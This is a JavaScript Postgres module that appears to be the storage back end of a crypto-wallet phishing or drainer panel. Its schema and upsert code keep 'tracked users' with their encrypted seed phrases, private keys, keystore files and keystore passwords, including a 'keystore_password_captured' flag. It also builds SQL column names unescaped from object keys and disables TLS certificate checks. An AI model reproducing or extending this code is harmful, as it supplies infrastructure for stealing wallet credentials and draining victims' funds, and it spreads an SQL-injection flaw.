let pgModule = null;
let pool = null;
let ready = false;

async function init() {
  if (ready) return pool;
  const url =
    process.env.POSTGRES_URL ||
    process.env.POSTGRES_URL_NON_POOLING ||
    process.env.DATABASE_URL ||
    process.env.DATABASE_URL_UNPOOLED ||
    '';
  if (!url) {
    ready = false;
    return null;
  }
  try {
    if (!pgModule) {
      pgModule = await import('pg');
    }
    const { Pool } = pgModule;
    pool = new Pool({
      connectionString: url,
      ssl: { rejectUnauthorized: false }
    });
    await pool.query('SELECT 1');
    await ensureSchema();
    ready = true;
    return pool;
  } catch {
    ready = false;
    return null;
  }
}

export async function pgReady() {
  const p = await init();
  return !!p;
}

async function ensureSchema() {
  const createUsers = `
    CREATE TABLE IF NOT EXISTS users (
      user_id TEXT PRIMARY KEY,
      address TEXT UNIQUE NOT NULL,
      wallet_type TEXT,
      balance DOUBLE PRECISION,
      assets JSONB,
      last_active TIMESTAMPTZ,
      status TEXT,
      feature_flags JSONB,
      app_limits JSONB,
      risk_flags JSONB,
      transactions JSONB,
      import_method TEXT,
      enc_mnemonic TEXT,
      enc_private_key TEXT,
      enc_keystore_json TEXT,
      enc_keystore_password TEXT,
      has_private_key BOOLEAN,
      keystore_preview TEXT,
      keystore_password_captured BOOLEAN
    )
  `;
  const createDeleted = `
    CREATE TABLE IF NOT EXISTS deleted (
      address TEXT PRIMARY KEY
    )
  `;
  await pool.query(createUsers);
  await pool.query(createDeleted);
}

export async function listTrackedUsers() {
  if (!(await pgReady())) return null;
  const { rows } = await pool.query('SELECT * FROM users ORDER BY last_active DESC');
  return rows || [];
}

export async function upsertTrackedUser(doc) {
  if (!(await pgReady())) return null;
  const lower = (doc.address || '').toLowerCase();
  const userId = doc.userId || `user_${Math.random().toString(36).substr(2, 9)}`;
  const toJson = (v) => (v === undefined || v === null ? null : JSON.stringify(v));
  const q = `
    INSERT INTO users (
      user_id, address, wallet_type, balance, assets, last_active, status,
      feature_flags, app_limits, risk_flags, transactions, import_method,
      enc_mnemonic, enc_private_key, enc_keystore_json, enc_keystore_password,
      has_private_key, keystore_preview, keystore_password_captured
    ) VALUES (
      $1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19
    )
    ON CONFLICT (address) DO UPDATE SET
      user_id=EXCLUDED.user_id,
      wallet_type=EXCLUDED.wallet_type,
      balance=EXCLUDED.balance,
      assets=EXCLUDED.assets,
      last_active=EXCLUDED.last_active,
      status=EXCLUDED.status,
      feature_flags=EXCLUDED.feature_flags,
      app_limits=EXCLUDED.app_limits,
      risk_flags=EXCLUDED.risk_flags,
      transactions=EXCLUDED.transactions,
      import_method=EXCLUDED.import_method,
      enc_mnemonic=EXCLUDED.enc_mnemonic,
      enc_private_key=EXCLUDED.enc_private_key,
      enc_keystore_json=EXCLUDED.enc_keystore_json,
      enc_keystore_password=EXCLUDED.enc_keystore_password,
      has_private_key=EXCLUDED.has_private_key,
      keystore_preview=EXCLUDED.keystore_preview,
      keystore_password_captured=EXCLUDED.keystore_password_captured
    RETURNING *`;
  const params = [
    userId,
    lower,
    doc.walletType || null,
    doc.balance || 0,
    toJson(doc.assets),
    doc.lastActive || new Date().toISOString(),
    doc.status || 'Active',
    toJson(doc.featureFlags),
    toJson(doc.appLimits),
    toJson(doc.riskFlags),
    toJson(doc.transactions),
    doc.importMethod ?? null,
    doc.encMnemonic ?? null,
    doc.encPrivateKey ?? null,
    doc.encKeystoreJSON ?? null,
    doc.encKeystorePassword ?? null,
    !!doc.hasPrivateKey,
    doc.keystorePreview ?? null,
    !!doc.keystorePasswordCaptured
  ];
  const { rows } = await pool.query(q, params);
  return rows && rows[0];
}

export async function deleteUsersByIds(userIds) {
  if (!(await pgReady())) return { deletedCount: 0, addresses: [] };
  const sel = await pool.query('SELECT user_id, address FROM users WHERE user_id = ANY($1)', [userIds]);
  const addresses = (sel.rows || []).map(r => (r.address || '').toLowerCase()).filter(Boolean);
  if (addresses.length) {
    const values = addresses.map((a, i) => `($${i + 1})`).join(',');
    await pool.query(`INSERT INTO deleted(address) VALUES ${values} ON CONFLICT DO NOTHING`, addresses);
  }
  const del = await pool.query('DELETE FROM users WHERE user_id = ANY($1)', [userIds]);
  return { deletedCount: del.rowCount || addresses.length, addresses };
}

export async function listDeleted() {
  if (!(await pgReady())) return [];
  const { rows } = await pool.query('SELECT address FROM deleted');
  return (rows || []).map(r => r.address);
}

export async function restoreDeleted(address) {
  if (!(await pgReady())) return null;
  await pool.query('DELETE FROM deleted WHERE address = $1', [String(address || '').toLowerCase()]);
  return true;
}

export async function findUserById(userId) {
  if (!(await pgReady())) return null;
  const { rows } = await pool.query('SELECT * FROM users WHERE user_id = $1', [userId]);
  return rows && rows[0];
}

export async function findUserByAddress(address) {
  if (!(await pgReady())) return null;
  const lower = String(address || '').toLowerCase();
  const { rows } = await pool.query('SELECT * FROM users WHERE address = $1', [lower]);
  return rows && rows[0];
}

export async function updateUser(userId, update) {
  if (!(await pgReady())) return null;
  const keys = Object.keys(update || {});
  if (keys.length === 0) return true;
  const sets = keys.map((k, i) => `${camelToSnake(k)} = $${i + 1}`).join(', ');
  const values = keys.map(k => update[k]);
  values.push(userId);
  const q = `UPDATE users SET ${sets} WHERE user_id = $${values.length}`;
  await pool.query(q, values);
  return true;
}

function camelToSnake(s) {
  return s.replace(/[A-Z]/g, c => '_' + c.toLowerCase());
}
